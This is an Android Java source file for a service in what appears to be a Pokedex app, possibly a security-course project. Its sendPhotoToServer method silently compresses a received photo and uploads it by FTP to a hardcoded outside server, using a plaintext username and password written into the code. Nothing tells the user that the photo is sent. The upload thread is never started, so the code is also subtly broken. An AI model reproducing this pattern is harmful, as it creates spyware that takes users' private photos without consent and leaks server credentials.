package com.seginf.pokedex;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.IBinder;
import android.util.Log;

import org.apache.commons.net.ftp.FTPClient;

import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.InetAddress;


public class PokemonService extends Service {

    private static String TAG = "PokemonService";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "creating pokemon service");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (intent == null) return 0;

        Bitmap photo = intent.getParcelableExtra("photo");

        if (photo == null) {
            Log.d(TAG, "photo was null");
            return 0;
        }

        Log.d(TAG, "received bitmap!!");

        sendPhotoToServer(photo);

        return Service.START_STICKY;
    }

    private void sendPhotoToServer(final Bitmap photo) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                photo.compress(Bitmap.CompressFormat.PNG, 100, baos);
                baos.toByteArray();

                FTPClient ftpClient = new FTPClient();

                try {

                    ftpClient.connect(InetAddress.getByName("ftp.deanastasie.com.ar"));
                    ftpClient.login("deanastasie", "3rLJskyhsF");
                    ftpClient.changeWorkingDirectory("test/fotos/");

                    String name = Double.toString(Math.random());

                    if (ftpClient.getReplyString().contains("250")) {
                        ftpClient.setFileType(org.apache.commons.net.ftp.FTP.BINARY_FILE_TYPE);
                        BufferedInputStream buffIn;
                        InputStream is = new ByteArrayInputStream(baos.toByteArray());
                        buffIn = new BufferedInputStream(is);
                        ftpClient.enterLocalPassiveMode();
                        ftpClient.storeFile(name, buffIn);
                        buffIn.close();
                        ftpClient.logout();
                        ftpClient.disconnect();
                    }

                } catch (Exception e) {
                    e.getStackTrace();
                }
            }
        });
    }
}
